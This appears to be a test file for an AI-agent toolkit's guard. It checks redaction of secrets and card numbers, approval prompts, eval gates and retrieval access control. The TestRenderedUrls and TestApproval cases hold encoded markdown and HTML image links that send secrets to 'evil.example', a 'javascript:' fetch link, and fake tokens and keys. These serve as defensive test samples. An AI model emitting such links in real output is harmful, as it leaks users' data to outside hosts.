"""Attacks and failures found in a review (2026-11-25), each with the test that stops it.

Guard: links that only become URLs after a renderer decodes them, secrets cut in half by truncation,
card numbers hidden by prefixes, separators or full-width digits, images that still carry a query,
values that stored_args skipped. Agent: the approval prompt showed the unscreened call. Tools: a
result that is not JSON-serialisable crashed the loop after a write ran. Evals: gates that passed
with zero trials, with escaped secrets, or with a leaking approval prompt. Release, retrieval, policy
and context: unhashed safety flags, restricted documents shifting public rankings, crashes and BOMs.
"""

import contextlib
import importlib.util
import unittest.mock
import datetime
import decimal
import io
import json
import os
import tempfile
import unittest

from pathlib import Path

from kit import (Agent, Call, Doc, Guard, Index, Pending, Policy, Reply, Scripted, Session, Tool, Toolbox, User,
                 anyone, bundle, evals, load_prompt)

ALICE = User("alice", frozenset({"employee"}))
INTERN = User("ian", frozenset({"intern"}))
CARD = "4111 1111 1111 1111"
FULLWIDTH = str.maketrans({chr(c): chr(c + 0xFEE0) for c in range(0x21, 0x7F)})


def github_token() -> str:
    return "gh" + "p_" + "x7" * 18  # built at runtime, as in test_guard


def pem(body_lines: int = 25) -> str:
    begin, end = "-----BEGIN " + "PRIVATE KEY-----", "-----END " + "PRIVATE KEY-----"
    return "\n".join([begin, *("MIIE" + "Qk" * 30 for _ in range(body_lines)), end])


class TestRenderedUrls(unittest.TestCase):
    """A renderer decodes entities, drops tabs and newlines, and unescapes backslashes before it fetches."""

    def test_links_that_become_urls_only_after_decoding_are_caught(self):
        g = Guard(hosts=("example.com",))
        for attack in ("![x](https&#58;&#47;&#47;evil.example/p.png?d=SECRET)",
                       "![x](https&colon;//evil.example/p.png?d=SECRET)",
                       '<img src="&#47;&#47;evil.example/p.png?d=SECRET">',
                       '<img src="/\n/evil.example/p.png?d=SECRET">',
                       '<img src="ht\ttps://evil.example/p.png?d=SECRET">',
                       "![x](https\\://evil.example/p.png?d=SECRET)",
                       "[x](https\\://evil.example/?d=SECRET)",
                       '<a href="https&#58;&#47;&#47;evil.example/?d=SECRET">x</a>',
                       "<a href='javascript&#58;fetch(1)'>x</a>"):
            out = g.output(attack).text
            self.assertNotIn("evil.example", out.replace("&#47;", "/"), attack)
            self.assertNotIn("SECRET", out, attack)
            self.assertNotIn("javascript", out.lower(), attack)

    def test_safe_links_survive_decoding(self):
        g = Guard(hosts=("example.com",))
        for ok in ("[docs](https://docs.example.com/a?b=1)", "[help](/help)", "![logo](/logo.png)",
                   '<a href="https&#58;//example.com/a">x</a>', "see [the guide](guide.md)"):
            self.assertEqual(g.output(ok).text, ok)


class TestTruncation(unittest.TestCase):
    """Tool results are screened whole, then cut; a cut must never split a secret past its rule."""

    def agent(self, payload: str) -> tuple[Agent, Session]:
        tb = Toolbox(Policy().allow("dump", anyone)).add(Tool("dump", "returns a file", {}, fn=lambda user: payload))
        agent = Agent(Scripted([Reply(calls=[Call("1", "dump", {})]), Reply("ok")]), "sys", tb, guard=Guard())
        session = agent.start(ALICE)
        agent.run(session, ALICE, "show the file")
        return agent, session

    def test_a_card_cut_at_the_limit_is_still_redacted(self):
        prefix = "x" * 3976 + " card "  # the 4000-character cut falls after the 15th digit
        self.assertEqual(len(prefix) + len("4111 1111 1111 111"), 4000)
        _, session = self.agent(prefix + CARD + " end")
        seen = session.messages[2]["content"]
        self.assertNotIn("4111 1111 1111 11", seen)
        self.assertIn("truncated", seen)

    def test_a_private_key_cut_at_the_limit_is_still_redacted(self):
        _, session = self.agent("notes " * 420 + pem())
        self.assertNotIn("Qk" * 30, session.messages[2]["content"])

    def test_a_key_with_no_end_line_is_redacted(self):
        key = pem().rsplit("\n", 3)[0]  # END line and the last body lines missing
        out = Guard().data("here it is:\n" + key + "\n\nThat was the key.").text
        self.assertNotIn("Qk" * 30, out)
        self.assertIn("That was the key.", out)
        self.assertIn("[REDACTED:private_key]", out)


class TestCards(unittest.TestCase):
    def test_cards_after_other_digits_or_with_other_separators_are_redacted(self):
        for text in ("ref 1234 " + CARD, "20240101 4111-1111-1111-1111", "4111 1111 1111 1111",
                     "4111.1111.1111.1111", "4111 1111 1111 1111", CARD.translate(FULLWIDTH),
                     "４１１１　１１１１　１１１１　１１１１"):
            out = Guard().prompt(text).text
            self.assertIn("[REDACTED:card]", out, text)
            self.assertNotIn("1111", out.translate({ord("１"): "1"}), text)

    def test_full_width_credentials_are_redacted(self):
        out = Guard().prompt("key " + github_token().translate(FULLWIDTH)).text
        self.assertEqual(out, "key [REDACTED:github]")

    def test_numbers_that_are_not_cards_stay(self):
        for text in ("order 1234 5678 9012 3456 7", "v1.2.3.4", "총 12,345,678원", "１２３４"):
            self.assertEqual(Guard().prompt(text).text, text)


class TestImages(unittest.TestCase):
    def test_reference_images_of_every_form_need_no_query(self):
        g = Guard(hosts=("example.com",))
        for body in ("![r]", "![r][]", "![R][r]"):
            out = g.output(f"{body}\n\n[r]: https://example.com/p.png?d=SECRET").text
            self.assertNotIn("SECRET", out, body)
        kept = "![r]\n\n[r]: https://example.com/p.png"
        self.assertEqual(g.output(kept).text, kept)

    def test_relative_images_need_no_query_either(self):
        self.assertNotIn("SECRET", Guard().output("![a](/log.png?d=SECRET)").text)
        self.assertNotIn("SECRET", Guard().output('<img src="/log.png?d=SECRET">').text)
        self.assertEqual(Guard().output("![a](/logo.png)").text, "![a](/logo.png)")


class TestStoredArgs(unittest.TestCase):
    def test_numbers_and_keys_are_screened_too(self):
        args, labels = Guard().stored_args({"card": 4111111111111111, github_token(): "x",
                                            "items": [{"n": 4111111111111111}], "ok": 3, "flag": True})
        flat = json.dumps(args)
        self.assertNotIn("4111111111111111", flat)
        self.assertNotIn(github_token(), flat)
        self.assertEqual((args["ok"], args["flag"]), (3, True))
        self.assertIn("pii.card:redact", labels)


class TestApproval(unittest.TestCase):
    def test_the_approval_prompt_shows_the_screened_call(self):
        tb = Toolbox(Policy().allow("note", anyone)).add(
            Tool("note", "writes a note", {"text": {"type": "string"}}, kind="write", fn=lambda user, text: "noted"))
        leak = "![s](https://evil.example/p.png?d=salary-P9) and " + github_token()
        agent = Agent(Scripted([Reply(calls=[Call("1", "note", {"text": leak})]), Reply("Saved.")]), "sys", tb,
                      guard=Guard())
        session = agent.start(ALICE)
        out = agent.run(session, ALICE, "note it")
        self.assertIsInstance(out, Pending)
        self.assertNotIn("evil.example", str(out))
        self.assertNotIn(github_token(), str(out))
        self.assertEqual(agent.resume(session, ALICE, approved=True), "Saved.")


class TestResults(unittest.TestCase):
    def test_a_result_that_is_not_json_does_not_break_a_write(self):
        runs = []

        def refund(user, amount):
            runs.append(amount)
            return {"amount": decimal.Decimal("89.00"), "at": datetime.datetime(2026, 11, 25, 9, 30)}

        tb = Toolbox(Policy().allow("refund", anyone)).add(
            Tool("refund", "refunds", {"amount": {"type": "number"}}, fn=refund, kind="write", approval=False))
        session = Session(system="sys", tools=tb.schemas(ALICE))
        first = tb.execute(Call("1", "refund", {"amount": 89}), ALICE, session)
        self.assertTrue(first.ran)
        self.assertIn("89.00", first.content)
        again = tb.execute(Call("2", "refund", {"amount": 89}), ALICE, session)
        self.assertIn("already done", again.content)
        self.assertEqual(runs, [89])


def echo_build(answer: str = "ok", calls=None):
    """A fresh agent whose model asks for `calls` once, then answers `answer`."""
    def build():
        tb = Toolbox(Policy().allow("note", anyone)).add(
            Tool("note", "writes a note", {"text": {"type": "string"}}, kind="write", fn=lambda user, text: "noted"))
        replies = ([Reply(calls=calls)] if calls else []) + [Reply(answer)]
        return Agent(Scripted(replies), "sys", tb)
    return build


def case(**expect) -> dict:
    return {"id": "c", "suite": "safety", "user": {"id": "u", "roles": []}, "turns": ["hello"], "expect": expect}


class TestEvals(unittest.TestCase):
    def test_zero_trials_cannot_pass_the_gate(self):
        failing = case(contains=["never in the answer"])
        with self.assertRaises(ValueError):
            evals.run(echo_build(), [failing], k=0)
        with self.assertRaises(ValueError):
            evals.run(echo_build(), [{**failing, "trials": 0}], k=3)
        with contextlib.redirect_stderr(io.StringIO()), self.assertRaises(SystemExit):
            evals.main(["x.json", "--agent", "m:f", "--k", "0"])

    def test_unseen_text_is_found_however_it_is_escaped(self):
        for secret in ('pa"ss\\word', "line one\nline two", "탭\t문자"):
            c = {**case(unseen=[secret]), "turns": [f"my password is {secret}"]}
            ok, rows = evals.run(echo_build(), [c])
            self.assertFalse(ok, secret)
            self.assertIn("the model saw", rows[0]["failures"][0])

    def test_an_approval_prompt_that_leaks_can_fail_the_gate(self):
        build = echo_build(calls=[Call("1", "note", {"text": "CEO pay band is P9"})])
        ok, rows = evals.run(build, [case(approval_excludes=["P9"])])
        self.assertFalse(ok)
        self.assertEqual(rows[0]["failures"], ["the approval prompt contains 'P9'"])
        self.assertTrue(evals.run(build, [case(approval_excludes=["P10"])])[0])
        # excludes stays about the answer: a person may need to see the data to refuse sending it
        self.assertTrue(evals.run(build, [case(excludes=["P9"], pending=True)])[0])

    def test_cli_survives_no_cases_a_bom_and_a_narrow_console(self):
        with tempfile.TemporaryDirectory() as d:
            empty, bom = os.path.join(d, "empty.json"), os.path.join(d, "bom.json")
            with open(empty, "w", encoding="utf-8") as f:
                f.write("[]")
            with open(bom, "w", encoding="utf-8-sig") as f:
                json.dump([case(contains=["✅ 완료"])], f, ensure_ascii=False)
            narrow = io.TextIOWrapper(io.BytesIO(), encoding="ascii")
            with contextlib.redirect_stdout(narrow):
                self.assertEqual(evals.main([empty, "--agent", "tests.test_hardening:echo_build_default"]), 1)
                self.assertEqual(evals.main([bom, "--agent", "tests.test_hardening:echo_build_default"]), 1)
            narrow.seek(0)
            self.assertIn(b"GATE FAILED", narrow.buffer.getvalue())


echo_build_default = echo_build()


class TestRelease(unittest.TestCase):
    def test_safety_flags_are_part_of_the_release(self):
        def tool(**flags):
            return Tool("send", "sends", {"text": {"type": "string"}}, fn=lambda user, text: "", **flags)

        base = bundle("p", "m", [tool()])["version"]
        for flags in ({"kind": "write"}, {"outbound": True}, {"private": True}, {"untrusted": True},
                      {"kind": "write", "approval": False}):
            self.assertNotEqual(base, bundle("p", "m", [tool(**flags)])["version"], flags)
        self.assertEqual(bundle("p", "m", [tool()])["tools"], ["send"])
        self.assertEqual(bundle("p", "m", [{"name": "t"}])["tools"], ["t"])  # schemas still work


class TestRetrieval(unittest.TestCase):
    def test_restricted_documents_do_not_shift_what_others_find(self):
        public = [Doc("a", "Leave", "Annual leave is fifteen days and leave requests go to your manager."),
                  Doc("b", "Payroll", "Payroll runs monthly; leave payouts appear on the payroll slip.")]
        secret = [Doc(f"s{i}", "Exec", "Executive leave leave leave payroll bonus.", frozenset({"exec"}))
                  for i in range(5)]
        alone = Index(public).search("leave payroll", INTERN)
        mixed = Index(public + secret).search("leave payroll", INTERN)
        self.assertEqual([(c.doc_id, round(s, 9)) for c, s in alone], [(c.doc_id, round(s, 9)) for c, s in mixed])

    def test_an_empty_heading_does_not_crash(self):
        hits = Index([Doc("d", "Doc", "#\n\nThe office opens at nine.\n\n##   \n\nIt closes at six.")]).search(
            "office opens", ALICE)
        self.assertEqual(hits[0][0].doc_id, "d")


class TestPolicyAndContext(unittest.TestCase):
    def test_a_visibility_rule_that_raises_hides_the_tool(self):
        policy = Policy().allow("refund", lambda user, args: float(args["amount"]) <= 100)
        self.assertFalse(policy.visible(ALICE, "refund"))
        tb = Toolbox(policy).add(Tool("refund", "refunds", {}, fn=lambda user, amount=0: "ok"))
        self.assertEqual(tb.schemas(ALICE), [])

    def test_a_prompt_saved_with_a_bom_loads_clean(self):
        with tempfile.TemporaryDirectory() as d:
            path = os.path.join(d, "prompt.md")
            with open(path, "w", encoding="utf-8-sig") as f:
                f.write("You are the HR assistant.\n")
            self.assertEqual(load_prompt(path), "You are the HR assistant.")


if __name__ == "__main__":
    unittest.main()


class TestReviewTwo(unittest.TestCase):
    """Second review (2026-11-25): the example, the eval CLI, the benchmark and the freshness check."""

    def test_refunds_are_whole_cents_so_tiny_amounts_cannot_slip_past_the_cap(self):
        from examples import support
        refund = {t.name: t for t in support.tools()}["refund"].fn
        agent = User("a", frozenset({"support"}))
        with self.assertRaises(ValueError):
            refund(user=agent, ticket_id="T-1", amount=88.996)
        refund(user=agent, ticket_id="T-1", amount=88.99)
        with self.assertRaises(ValueError):
            refund(user=agent, ticket_id="T-1", amount=0.004)
        refund(user=agent, ticket_id="T-1", amount=0.01)  # 89.00 in all
        with self.assertRaises(ValueError):
            refund(user=agent, ticket_id="T-1", amount=0.01)

    def test_the_installed_launcher_finds_a_package_in_the_working_directory(self):
        import sys
        with tempfile.TemporaryDirectory() as d:
            pkg = os.path.join(d, "mypkg_review2")
            os.mkdir(pkg)
            with open(os.path.join(pkg, "__init__.py"), "w", encoding="utf-8") as f:
                f.write("from tests.test_hardening import echo_build_default as build\n")
            with open(os.path.join(d, "cases.json"), "w", encoding="utf-8") as f:
                json.dump([case(contains=["ok"])], f)
            here, path = os.getcwd(), list(sys.path)
            try:
                sys.path[:] = [p for p in sys.path if p not in ("", here, d)] + [here]  # as a console script sees it
                os.chdir(d)
                with contextlib.redirect_stdout(io.StringIO()):
                    self.assertEqual(evals.main(["cases.json", "--agent", "mypkg_review2:build"]), 0)
            finally:
                os.chdir(here)
                sys.path[:] = path
                sys.modules.pop("mypkg_review2", None)

    def test_benchmark_counts_every_unsafe_outcome(self):
        spec = importlib.util.spec_from_file_location("benchmark", Path(__file__).resolve().parents[2] / "scripts" / "benchmark.py")
        bench = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(bench)
        self.assertTrue(bench.unsafe("refund ran 2 times, expected 1"))
        self.assertTrue(bench.unsafe("the approval prompt contains 'p9'"))
        self.assertFalse(bench.unsafe("answer lacks 'policy'"))
        src = (Path(__file__).resolve().parents[2] / "scripts" / "benchmark.py").read_text(encoding="utf-8")
        self.assertNotIn('case["suite"] == "safety" and any(unsafe', src)  # regression suites count too

    def test_freshness_exit_codes(self):
        path = Path(__file__).resolve().parents[2] / "skill" / "building-ai-agents" / "scripts" / "check_freshness.py"
        spec = importlib.util.spec_from_file_location("check_freshness", path)
        cf = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(cf)
        rows = lambda *versions: {"checked": "2026-11-25", "items": [  # noqa: E731
            {"source": "pypi", "key": f"p{i}", "label": f"P{i}", "version": v, "released": "", **({} if v else {"error": "offline"})}
            for i, v in enumerate(versions)]}
        snap = {"checked": "2026-10-28", "items": [{"source": "pypi", "key": "p0", "version": "1.0"},
                                                    {"source": "pypi", "key": "p1", "version": "1.0"}]}
        with tempfile.TemporaryDirectory() as d:
            sp = os.path.join(d, "snap.json")
            with open(sp, "w", encoding="utf-8-sig") as f:  # a BOM is fine
                json.dump(snap, f)
            for result, argv, code in [(rows(None, None), [], 2), (rows("1.0", "1.0"), ["--strict"], 0),
                                       (rows("1.1", "1.0"), [], 0), (rows("1.1", "1.0"), ["--strict"], 1),
                                       (rows("1.0", None), ["--strict"], 1)]:
                out = io.StringIO()
                with unittest.mock.patch.object(cf, "collect", lambda with_models, r=result: json.loads(json.dumps(r))), \
                        unittest.mock.patch("sys.argv", ["x", "--no-models", "--snapshot", sp, *argv]), \
                        contextlib.redirect_stdout(out):
                    self.assertEqual(cf.main(), code, (result["items"], argv))
                if None in [i["version"] for i in result["items"]]:
                    self.assertIn("could not be checked", out.getvalue())
